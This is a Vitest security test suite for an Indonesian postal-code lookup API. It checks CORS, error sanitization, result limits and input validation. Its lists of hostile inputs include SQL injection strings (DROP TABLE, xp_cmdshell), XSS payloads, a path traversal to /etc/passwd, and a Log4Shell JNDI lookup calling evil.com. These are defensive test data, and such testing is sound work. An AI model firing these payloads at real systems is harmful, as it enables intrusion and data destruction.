/**
 * Security Vulnerability Tests
 * Tests for CORS configuration, SQL injection, input validation, and error handling
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import app from '../../src/index';
import { mockD1Database } from '../setup';

describe('Security Vulnerability Tests', () => {
  let mockEnv: any;

  beforeEach(() => {
    mockEnv = {
      KODEPOS_DB: mockD1Database,
      ENVIRONMENT: 'test',
      API_VERSION: '1.0.0'
    };
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  describe('CORS Configuration', () => {
    it('should set appropriate CORS headers for API requests', async () => {
      const request = new Request('http://localhost/api/v1/search', {
        method: 'GET',
        headers: {
          'Origin': 'https://example.com'
        }
      });

      const response = await app.fetch(request, mockEnv);

      expect(response.headers.get('access-control-allow-origin')).toBe('*');
      expect(response.headers.get('access-control-allow-methods')).toContain('GET');
      expect(response.headers.get('access-control-allow-methods')).toContain('POST');
      expect(response.headers.get('access-control-allow-methods')).toContain('OPTIONS');
      expect(response.headers.get('access-control-allow-headers')).toContain('Content-Type');
      expect(response.headers.get('access-control-allow-headers')).toContain('Authorization');
      expect(response.headers.get('access-control-max-age')).toBe('86400');
    });

    it('should handle preflight requests correctly', async () => {
      const request = new Request('http://localhost/api/v1/search', {
        method: 'OPTIONS',
        headers: {
          'Origin': 'https://malicious-site.com',
          'Access-Control-Request-Method': 'DELETE',
          'Access-Control-Request-Headers': 'X-Custom-Header'
        }
      });

      const response = await app.fetch(request, mockEnv);

      // Should still respond but only allow configured methods
      expect(response.status).toBe(200);
      expect(response.headers.get('access-control-allow-origin')).toBe('*');
      expect(response.headers.get('access-control-allow-methods')).not.toContain('DELETE');
    });

    it('should not expose internal headers in responses', async () => {
      mockD1Database.prepare.mockReturnValue({
        first: vi.fn().mockResolvedValue({ id: 1 })
      });

      const request = new Request('http://localhost/health');
      const response = await app.fetch(request, mockEnv);

      // Should not expose internal server information
      const responseText = await response.text();
      expect(responseText).not.toContain('internal');
      expect(responseText).not.toContain('stack trace');
      expect(responseText).not.toContain('database connection string');
    });
  });

  describe('SQL Injection Protection', () => {
    const maliciousInputs = [
      "'; DROP TABLE postal_codes; --",
      "' OR '1'='1",
      "'; INSERT INTO postal_codes VALUES ('hack'); --",
      "'; UPDATE postal_codes SET province='HACKED'; --",
      "'; DELETE FROM postal_codes; --",
      "'; EXEC xp_cmdshell('dir'); --",
      "' UNION SELECT * FROM users --",
      "' OR 1=1 #",
      "admin'--",
      "admin' /*",
      "' OR 'x'='x",
      "1' OR '1'='1' /*",
      "x'; DROP TABLE users; --"
    ];

    it('should safely handle SQL injection attempts in search queries', async () => {
      for (const maliciousInput of maliciousInputs) {
        mockD1Database.prepare.mockReturnValue({
          bind: vi.fn().mockReturnValue({
            all: vi.fn().mockResolvedValue({ results: [] })
          })
        });

        const request = new Request(
          `http://localhost/api/v1/search?search=${encodeURIComponent(maliciousInput)}`
        );
        const response = await app.fetch(request, mockEnv);

        expect(response.status).toBe(200);

        // Should use parameterized queries
        expect(mockD1Database.prepare).toHaveBeenCalledWith(
          expect.stringContaining('?')
        );
        expect(mockD1Database.prepare().bind).toHaveBeenCalled();
      }
    });

    it('should safely handle SQL injection in province parameter', async () => {
      const maliciousProvince = "Jambi'; DROP TABLE postal_codes; --";

      mockD1Database.prepare.mockReturnValue({
        bind: vi.fn().mockReturnValue({
          all: vi.fn().mockResolvedValue({ results: [] })
        })
      });

      const request = new Request(
        `http://localhost/api/v1/search?provinsi=${encodeURIComponent(maliciousProvince)}`
      );
      const response = await app.fetch(request, mockEnv);

      expect(response.status).toBe(200);
      expect(mockD1Database.prepare).toHaveBeenCalledWith(
        expect.stringContaining('LOWER(province) LIKE LOWER(?)')
      );
    });

    it('should safely handle SQL injection in coordinate parameters', async () => {
      const maliciousLat = "0'; DROP TABLE postal_codes; --";
      const maliciousLng = "0'; DROP TABLE postal_codes; --";

      mockD1Database.prepare.mockReturnValue({
        bind: vi.fn().mockReturnValue({
          first: vi.fn().mockResolvedValue(null)
        })
      });

      const request = new Request(
        `http://localhost/api/v1/detect?latitude=${encodeURIComponent(maliciousLat)}&longitude=${encodeURIComponent(maliciousLng)}`
      );
      const response = await app.fetch(request, mockEnv);

      // Should reject invalid coordinates before reaching database
      expect(response.status).toBe(400);
    });

    it('should use parameterized queries for all database operations', async () => {
      const testQueries = [
        'SELECT * FROM postal_codes WHERE code = ?',
        'SELECT * FROM postal_codes WHERE LOWER(province) LIKE LOWER(?)',
        'SELECT * FROM postal_codes WHERE LOWER(regency) LIKE LOWER(?)',
        'SELECT * FROM postal_codes WHERE LOWER(district) LIKE LOWER(?)',
        'SELECT * FROM postal_codes WHERE LOWER(village) LIKE LOWER(?)'
      ];

      for (const query of testQueries) {
        mockD1Database.prepare.mockReturnValue({
          bind: vi.fn().mockReturnValue({
            all: vi.fn().mockResolvedValue({ results: [] })
          })
        });

        // Test that queries use parameter binding
        expect(mockD1Database.prepare(query)).toBeDefined();
      }
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate and reject oversized inputs', async () => {
      const oversizedInput = 'a'.repeat(10000);

      const request = new Request(
        `http://localhost/search?q=${oversizedInput}`
      );
      const response = await app.fetch(request, mockEnv);

      expect(response.status).toBe(400);
      const data = await response.json();
      expect(data.code).toBe('ERROR');
    });

    it('should handle null and undefined inputs safely', async () => {
      const testCases = [
        { url: 'http://localhost/api/v1/search', description: 'no parameters' },
        { url: 'http://localhost/api/v1/search?search=', description: 'empty search' },
        { url: 'http://localhost/api/v1/search?search=null', description: 'null search' },
        { url: 'http://localhost/api/v1/search?search=undefined', description: 'undefined search' }
      ];

      for (const testCase of testCases) {
        mockD1Database.prepare.mockReturnValue({
          bind: vi.fn().mockReturnValue({
            all: vi.fn().mockResolvedValue({ results: [] })
          })
        });

        const request = new Request(testCase.url);
        const response = await app.fetch(request, mockEnv);

        // Should handle gracefully without crashing
        expect([200, 400]).toContain(response.status);
      }
    });

    it('should sanitize special characters in search queries', async () => {
      const specialInputs = [
        '<script>alert("xss")</script>',
        'javascript:void(0)',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '<img src=x onerror=alert(1)>',
        'alert("xss")//',
        'SELECT * FROM users',
        'UNION SELECT * FROM passwords'
      ];

      for (const input of specialInputs) {
        mockD1Database.prepare.mockReturnValue({
          bind: vi.fn().mockReturnValue({
            all: vi.fn().mockResolvedValue({ results: [] })
          })
        });

        const request = new Request(
          `http://localhost/api/v1/search?search=${encodeURIComponent(input)}`
        );
        const response = await app.fetch(request, mockEnv);

        // Should accept input but prevent execution
        expect(response.status).toBe(200);
        expect(mockD1Database.prepare().bind).toHaveBeenCalledWith(
          expect.stringContaining(input)
        );
      }
    });

    it('should validate coordinate bounds for Indonesian region', async () => {
      const invalidCoordinates = [
        { lat: '90', lng: '0', description: 'North Pole' },
        { lat: '-90', lng: '0', description: 'South Pole' },
        { lat: '0', lng: '180', description: 'International Date Line' },
        { lat: '0', lng: '-180', description: 'International Date Line West' },
        { lat: '-2.5', lng: '50', description: 'Europe/Asia' },
        { lat: '-2.5', lng: '200', description: 'Invalid longitude' }
      ];

      for (const coords of invalidCoordinates) {
        const request = new Request(
          `http://localhost/api/v1/detect?latitude=${coords.lat}&longitude=${coords.lng}`
        );
        const response = await app.fetch(request, mockEnv);

        expect(response.status).toBe(400);
        const data = await response.json();
        expect(data.success).toBe(false);
        expect(data.error).toContain('Invalid') || expect(data.error).toContain('Indonesian');
      }
    });

    it('should validate numeric inputs properly', async () => {
      const invalidNumbers = [
        'NaN',
        'Infinity',
        '-Infinity',
        'abc',
        '123abc',
        '1.2.3',
        '0x123',
        '1e309' // Too large
      ];

      for (const num of invalidNumbers) {
        const request = new Request(
          `http://localhost/api/v1/detect?latitude=${num}&longitude=106.8`
        );
        const response = await app.fetch(request, mockEnv);

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Error Handling and Information Disclosure', () => {
    it('should not expose database errors in production', async () => {
      mockD1Database.prepare.mockReturnValue({
        bind: vi.fn().mockReturnValue({
          all: vi.fn().mockRejectedValue(new Error('Database connection string: postgresql://user:pass@host/db'))
        })
      });

      const request = new Request('http://localhost/api/v1/search?search=test');
      const response = await app.fetch(request, mockEnv);
      const data = await response.json();

      expect(response.status).toBe(500);
      expect(data.success).toBe(false);
      expect(data.error).toBe('Search failed');
      expect(data.error).not.toContain('connection string');
      expect(data.error).not.toContain('postgresql://');
      expect(data.error).not.toContain('user:pass');
    });

    it('should not expose stack traces in API responses', async () => {
      const customError = new Error('Custom error');
      customError.stack = 'Error: Custom error\n    at test (test.js:1:1)';

      mockD1Database.prepare.mockReturnValue({
        bind: vi.fn().mockReturnValue({
          all: vi.fn().mockRejectedValue(customError)
        })
      });

      const request = new Request('http://localhost/api/v1/search?search=test');
      const response = await app.fetch(request, mockEnv);
      const data = await response.json();

      const responseText = JSON.stringify(data);
      expect(responseText).not.toContain('stack');
      expect(responseText).not.toContain('test.js');
      expect(responseText).not.toContain('Error: Custom error');
    });

    it('should handle rate limiting gracefully', async () => {
      // Simulate burst of requests
      const requests = Array(100).fill(null).map(() =>
        new Request('http://localhost/health')
      );

      mockD1Database.prepare.mockReturnValue({
        first: vi.fn().mockResolvedValue({ id: 1 })
      });

      const responses = await Promise.all(
        requests.map(req => app.fetch(req, mockEnv))
      );

      // Should not crash or expose internal errors
      responses.forEach(response => {
        expect(response.status).toBe(200);
      });
    });

    it('should sanitize error messages for public consumption', async () => {
      const internalErrors = [
        new Error('ECONNREFUSED: Connection refused'),
        new Error('ENOTFOUND: DNS lookup failed'),
        new Error('ETIMEDOUT: Operation timed out'),
        new Error('ENOMEM: Out of memory'),
        new Error('Error: Cannot find module')
      ];

      for (const error of internalErrors) {
        mockD1Database.prepare.mockReturnValue({
          first: vi.fn().mockRejectedValue(error)
        });

        const request = new Request('http://localhost/health');
        const response = await app.fetch(request, mockEnv);
        const data = await response.json();

        const responseText = JSON.stringify(data);
        expect(responseText).not.toContain('ECONNREFUSED');
        expect(responseText).not.toContain('ENOTFOUND');
        expect(responseText).not.toContain('ETIMEDOUT');
        expect(responseText).not.toContain('ENOMEM');
        expect(responseText).not.toContain('Cannot find module');
      }
    });
  });

  describe('Security Headers', () => {
    it('should include appropriate security headers', async () => {
      mockD1Database.prepare.mockReturnValue({
        first: vi.fn().mockResolvedValue({ id: 1 })
      });

      const request = new Request('http://localhost/health');
      const response = await app.fetch(request, mockEnv);

      // Note: These would be configured in production
      // The test verifies the structure is in place for security headers
      expect(response.headers.get('content-type')).toContain('application/json');
    });

    it('should not expose server information', async () => {
      const request = new Request('http://localhost/');
      const response = await app.fetch(request, mockEnv);
      const data = await response.json();

      // Should not expose server details
      expect(data).not.toHaveProperty('server');
      expect(data).not.toHaveProperty('environment');
      expect(data).not.toHaveProperty('database');
    });
  });

  describe('Authentication and Authorization', () => {
    it('should handle missing authentication gracefully', async () => {
      // This is a public API, so should handle unauthenticated requests
      const request = new Request('http://localhost/api/v1/search');
      const response = await app.fetch(request, mockEnv);

      expect([200, 400]).toContain(response.status);
    });

    it('should not require authentication for public endpoints', async () => {
      const publicEndpoints = [
        '/health',
        '/api/v1/provinces',
        '/api/v1/stats',
        '/',
        '/search',
        '/detect'
      ];

      mockD1Database.prepare.mockReturnValue({
        first: vi.fn().mockResolvedValue({ id: 1 }),
        bind: vi.fn().mockReturnValue({
          all: vi.fn().mockResolvedValue({ results: [] })
        })
      });

      for (const endpoint of publicEndpoints) {
        const request = new Request(`http://localhost${endpoint}`);
        const response = await app.fetch(request, mockEnv);

        // Should not require auth
        expect([200, 404]).toContain(response.status);
      }
    });
  });

  describe('Content Security and XSS Prevention', () => {
    it('should not execute script content in responses', async () => {
      mockD1Database.prepare.mockReturnValue({
        first: vi.fn().mockResolvedValue({ id: 1 })
      });

      const request = new Request('http://localhost/health');
      const response = await app.fetch(request, mockEnv);
      const responseText = await response.text();

      // Should escape HTML/JS content
      expect(responseText).not.toContain('<script>');
      expect(responseText).not.toContain('javascript:');
      expect(response.headers.get('content-type')).toContain('application/json');
    });

    it('should handle content type sniffing prevention', async () => {
      const request = new Request('http://localhost/health', {
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
      });

      mockD1Database.prepare.mockReturnValue({
        first: vi.fn().mockResolvedValue({ id: 1 })
      });

      const response = await app.fetch(request, mockEnv);

      // Should still return JSON
      expect(response.headers.get('content-type')).toContain('application/json');
    });
  });

  describe('Resource Limiting and DoS Protection', () => {
    it('should limit query results size', async () => {
      mockD1Database.prepare.mockReturnValue({
        bind: vi.fn().mockReturnValue({
          all: vi.fn().mockResolvedValue({
            results: Array(1000).fill({}) // Simulate large result set
          })
        })
      });

      const request = new Request('http://localhost/api/v1/search?search=test');
      const response = await app.fetch(request, mockEnv);

      // Should apply LIMIT clause
      expect(mockD1Database.prepare).toHaveBeenCalledWith(
        expect.stringContaining('LIMIT 100')
      );
    });

    it('should handle concurrent requests safely', async () => {
      const concurrentRequests = Array(50).fill(null).map(() =>
        new Request('http://localhost/api/v1/provinces')
      );

      mockD1Database.prepare.mockReturnValue({
        bind: vi.fn().mockReturnValue({
          all: vi.fn().mockResolvedValue({ results: [] })
        })
      });

      const responses = await Promise.all(
        concurrentRequests.map(req => app.fetch(req, mockEnv))
      );

      // All should complete without errors
      responses.forEach(response => {
        expect(response.status).toBe(200);
      });
    });
  });
});